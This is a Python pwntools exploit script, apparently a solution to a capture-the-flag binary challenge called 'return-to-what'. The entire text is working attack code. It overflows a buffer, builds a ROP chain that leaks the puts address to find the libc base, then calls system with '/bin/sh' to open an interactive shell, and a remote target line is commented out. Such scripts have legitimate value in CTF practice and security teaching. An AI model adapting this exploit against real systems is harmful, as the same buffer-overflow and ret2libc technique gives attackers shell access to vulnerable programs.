from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.log_level = 'DEBUG'
#for local
elf = context.binary = ELF("./return-to-what")
libc = ELF("./local_libc.so.6")
#libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
sh = gdb.debug("./return-to-what")
#for remote
#sh = remote("chal.duc.tf", 30003)

puts_got = p64(elf.got[b'puts'])
puts_plt = p64(elf.plt[b'puts'])
main_plt = p64(elf.symbols[b'main'] + 1)
padding = b'a'*56
pop_rdi = p64(0x000000000040122b)

# Leaking libc

payload = padding + pop_rdi + puts_got + puts_plt + main_plt
sh.sendlineafter("?\n",payload)
puts_leaked = sh.recvline().rstrip()
puts_leaked = u64(puts_leaked.ljust(8,b"\x00"))
print("LEAK : ",hex(puts_leaked))

#Calculating libc base from the offset

puts_offset = libc.symbols[b'puts']
libc_base = puts_leaked - puts_offset
print("LIBC Base : ",hex(libc_base))
system_offset = libc.symbols[b'system']
binsh_offset = next(libc.search("/bin/sh"))
exit_offset = libc.symbols[b'exit']

system = p64(libc_base + system_offset)
binsh = p64(libc_base + binsh_offset)
exit = p64(libc_base + exit_offset)

payload1 = padding + pop_rdi + binsh + system
sh.sendlineafter("?\n",payload1)

sh.interactive()
